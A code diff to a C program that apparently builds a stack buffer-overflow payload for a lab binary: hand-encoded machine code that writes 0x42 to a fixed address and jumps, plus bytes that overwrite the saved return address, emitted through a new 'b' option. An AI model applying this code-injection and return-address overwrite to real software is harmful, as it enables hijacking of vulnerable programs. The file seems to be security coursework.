@@ -44,6 +44,51 @@ int main(int argc,char *argv[]) {
 	C[121] = 0x08;
 	C[122] = 0x40;
 	C[123] = 0x00;
+	
+	
+	//movb $0x42, 0x600d84
+	//jmp 0x400803
+	
+	char B[124] = "Frank\0";
+	
+	// B[6] = 0xc6;
+	// B[7] = 0x05;
+	// B[8] = 0x84;
+	// B[9] = 0x0d;
+	// B[10] = 0x60;
+	// B[11] = 0x00;
+	// B[12] = 0x42;
+	
+	B[6] = 0xc6;
+	B[7] = 0x04;
+	B[8] = 0x25;
+	B[9] = 0x84;
+	B[10] = 0x0d;
+	B[11] = 0x60;
+	B[12] = 0x00;
+	B[13] = 0x42;
+	
+	//TODO: translate assembly to hex
+	//jump and return
+	B[14] = 0xe9;
+	B[15] = 0x02;
+	B[16] = 0x01;
+	B[17] = 0x00;
+	B[18] = 0x00;
+	B[19] = 0x00;
+	
+	//Restore the address of method checkName
+	B[72] = 0x59;
+	B[73] = 0x08;
+	B[74] = 0x40;
+	B[75] = 0x00;
+	
+	//write the return address to buffer which contains above assembly code.
+	//jump to code at the beginning of the array
+	B[120] = 0xc6;
+	B[121] = 0x0d;
+	B[122] = 0x60;
+	B[123] = 0x00;
 
 
 	switch(argv[1][0]) {
@@ -56,6 +101,9 @@ int main(int argc,char *argv[]) {
 		break;
 	case 'c':
 		write(1, C, 124);
+		break;
+	case 'b':
+		write(1, B, 124);
 		break;
 	default:
 		break;
